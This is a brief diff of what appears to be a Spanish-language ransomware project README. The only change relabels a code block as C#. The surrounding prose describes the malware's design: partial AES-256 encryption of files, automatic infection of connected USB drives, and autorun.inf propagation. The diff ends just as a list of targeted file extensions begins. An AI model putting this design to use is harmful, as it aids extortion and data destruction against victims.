@@ -36,7 +36,7 @@
 
 <img src="https://img.shields.io/badge/ENCRIPTACIÓN:-093fb9.svg"> Incluye una amplia variedad de extensiones a cifrar y utiliza el algoritmo AES-256, lo que hace que descifrar los archivos sin la clave sea prácticamente difícil. La encriptación es de tipo <ins>parcial</ins>: solo encripta el primer MB de cada archivo, suficiente para dejarlo corrupto y que la encriptación sea más rápida. La extensión original es guardada dentro del archivo encriptado. Detecta automáticamente si existen USB conectadas, si las hay, encripta todos los archivos que tiene dentro y crea archivo **autorun.inf** para mayor propagación; aplica también para versiones antiguas de Windows.
 
-```python
+```csharp
 // Lista de extensiones a encriptar - EXTENSA Y COMPLETA
 List<string> targetExtensions = new List<string> 
 {       
